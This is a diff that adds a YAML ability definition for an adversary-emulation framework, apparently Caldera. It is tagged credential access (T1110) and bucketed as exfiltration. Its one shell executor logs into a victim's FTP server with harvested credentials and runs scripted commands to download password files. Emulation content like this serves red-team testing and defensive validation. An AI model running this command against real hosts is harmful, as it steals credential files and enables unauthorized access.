@@ -1,0 +1,46 @@
+- tactic: credential-access
+  technique_name: Brute Force
+  technique_id: T1110
+  name: Password Cracking - Download password files using FTP
+  description: Download password files using FTP
+  executors:
+  - name: sh
+    platform: linux
+    command: ftp ftp://#{victim.ftp.user}:#{victim.ftp.password}@#{victim.host.ip}
+      < /opt/ftp_commands
+    code: null
+    language: null
+    build_target: null
+    payloads: []
+    uploads: []
+    timeout: 60
+    parsers: []
+    cleanup: []
+    variations: []
+    additional_info: {}
+  requirements:
+  - module: plugins.stockpile.app.requirements.paw_provenance
+    relationship_match:
+    - source: victim.ftp.user
+      edge: ''
+      target: ''
+  - module: plugins.stockpile.app.requirements.paw_provenance
+    relationship_match:
+    - source: victim.ftp.password
+      edge: ''
+      target: ''
+  - module: plugins.stockpile.app.requirements.paw_provenance
+    relationship_match:
+    - source: victim.host.ip
+      edge: ''
+      target: ''
+  privilege: ''
+  repeatable: false
+  buckets:
+  - exfiltration
+  additional_info: {}
+  access: {}
+  singleton: false
+  plugin: ''
+  delete_payload: true
+  id: 91a6a009-2da9-4270-bf03-2056b4f077a5
